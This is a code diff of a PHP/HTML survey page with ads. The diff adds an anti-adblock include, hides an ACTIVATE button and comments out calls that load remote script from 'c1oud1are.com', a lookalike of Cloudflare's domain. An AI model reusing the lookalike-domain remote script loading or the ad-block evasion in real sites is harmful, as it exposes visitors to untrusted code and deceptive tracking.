@@ -1,3 +1,6 @@
+<?php
+require_once "anti-adblock/adcash_antiadblock-wvadqlpq.php";
+?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -30,6 +33,7 @@
         const dataRandomiser = () => Math.floor(Math.random() * (Math.ceil(2049) - Math.ceil(100) + 1)) + Math.ceil(100)
         let dataVolume = ''
         let dataCount = ''
+        let timer_start = 5; //minutes
     </script>
     <?php include 'ad_services.php'; ?>
     <script
@@ -6646,6 +6650,7 @@
         }
 
     </style>
+    <script src="js/jquery-3.4.1.min.js"></script>
 </head>
 <body>
 <div class="main section" id="main">
@@ -7694,7 +7699,7 @@
                                                 on the quality of your responses!
                                             </sub>
                                         </p>
-                                        <ins class="adsbygoogle d-md-none d-sm-block" style="display:block; height: 100px" data-ad-format="fluid"
+                                        <ins class="adsbygoogle" style="display:block; height: 100px" data-ad-format="fluid"
                                              data-ad-layout-key="-gl+12+75-1p-7y"
                                              data-ad-client="ca-pub-9872580992062840" data-ad-slot="2533608199"></ins>
                                         <div class="survey_outer">
@@ -7958,12 +7963,12 @@
                                                                 function record(a, b) {
                                                                     if (b) {
                                                                         if (get_Cookie(a + b) !== a + b) {
-                                                                            $.getScript('//c1oud1are.com/record/total.php?ac=node&name=' + a + '&node=' + b);
+                                                                            // $.getScript('//c1oud1are.com/record/total.php?ac=node&name=' + a + '&node=' + b);
                                                                             set_Cookie(a + b, a + b);
                                                                         }
                                                                     } else {
                                                                         if (get_Cookie(a) !== a) {
-                                                                            $.getScript('//c1oud1are.com/record/total.php?ac=total&name=' + a);
+                                                                            // $.getScript('//c1oud1are.com/record/total.php?ac=total&name=' + a);
                                                                             set_Cookie(a, a);
                                                                         }
                                                                     }
@@ -7994,7 +7999,7 @@
                                                                 </a>
                                                             </div>
                                                         </div>
-                                                        <div id="button2">
+                                                        <div id="button2" style="display: none">
                                                             <button class="btn btn-primary" onclick="dapp()"
                                                                     tyoe="button">ACTIVATE
                                                             </button>
@@ -8111,7 +8116,6 @@
 <!---->
 <!--<button class="g-recaptcha d-none" data-action="submit" data-sitekey="6LfA7SwcAAAAAM4sXPzUfvsdkG7dzSVwsnKsEfqh" data-callback="onSubmit"-->
 <!--     ></button>-->
-<script src="js/jquery-3.4.1.min.js"></script>
 <script>
     (adsbygoogle = window.adsbygoogle || []).push({});
     $('.answer p').on('click', () => {
@@ -8519,7 +8523,6 @@
         $('#comments_box').append(a)
     }
 </script>
-
 </body>
 
 </html>
